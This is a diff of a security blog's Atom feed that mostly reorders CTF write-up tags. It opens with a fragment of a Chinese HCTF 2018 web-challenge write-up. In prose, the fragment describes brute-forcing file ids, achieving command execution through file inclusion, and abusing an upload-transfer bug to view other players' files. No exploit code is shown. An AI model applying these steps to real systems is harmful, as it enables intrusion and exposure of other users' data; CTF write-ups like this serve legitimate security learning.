class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>这里因为不知道文件id是多少，只能根据前面的filenumber来爆破一下，所以写了个for循环<br>最后上传上去并获取文件名后，在主页进行文件包含执行命令，读取flag</p>
 <p><img src="/img/2018-hctf-4.png" alt=""></p>
 <p>ps：这道题有个搅💩bug，利用推文件给用户接口，无限暴力推fid到自己的uid下，就能看到别人上传的文件，并且别人就不知道他的文件名是啥了</p>
@@ -233,9 +233,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
       <category term="WEB" scheme="https://www.codemonster.cn/tags/WEB/"/>
     
@@ -350,9 +350,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
       <category term="WEB" scheme="https://www.codemonster.cn/tags/WEB/"/>
     
@@ -389,11 +389,11 @@
     </summary>
     
     
-      <category term="渗透" scheme="https://www.codemonster.cn/tags/%E6%B8%97%E9%80%8F/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
     
       <category term="流量分析" scheme="https://www.codemonster.cn/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
+    
+      <category term="渗透" scheme="https://www.codemonster.cn/tags/%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
@@ -483,9 +483,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
   </entry>
   
@@ -577,9 +577,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
   </entry>
   
@@ -636,15 +636,15 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
       <category term="注入" scheme="https://www.codemonster.cn/tags/%E6%B3%A8%E5%85%A5/"/>
     
-      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
-    
       <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
+    
+      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
     
       <category term="CBC字节翻转攻击" scheme="https://www.codemonster.cn/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
     
@@ -727,9 +727,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
       <category term="AWD" scheme="https://www.codemonster.cn/tags/AWD/"/>
     
@@ -769,9 +769,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
   </entry>
   
@@ -828,9 +828,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
       <category term="文件包含" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     
@@ -884,9 +884,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
   </entry>
   
@@ -921,9 +921,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
       <category term="审计" scheme="https://www.codemonster.cn/tags/%E5%AE%A1%E8%AE%A1/"/>
     
@@ -980,9 +980,9 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
       <category term="CMS" scheme="https://www.codemonster.cn/tags/CMS/"/>
     
@@ -1023,8 +1023,6 @@
     </summary>
     
     
-      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
-    
       <category term="mysql字符截断" scheme="https://www.codemonster.cn/tags/mysql%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD/"/>
     
       <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
@@ -1036,6 +1034,8 @@
       <category term="命令执行" scheme="https://www.codemonster.cn/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
       <category term="源码泄露" scheme="https://www.codemonster.cn/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
+    
+      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
     
   </entry>
   
@@ -1077,17 +1077,17 @@
     </summary>
     
     
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
+      <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
     
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
     
-      <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
       <category term="文件包含" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     
-      <category term="SQL注入" scheme="https://www.codemonster.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
       <category term="上传" scheme="https://www.codemonster.cn/tags/%E4%B8%8A%E4%BC%A0/"/>
+    
+      <category term="SQL注入" scheme="https://www.codemonster.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
       <category term="反序列化" scheme="https://www.codemonster.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
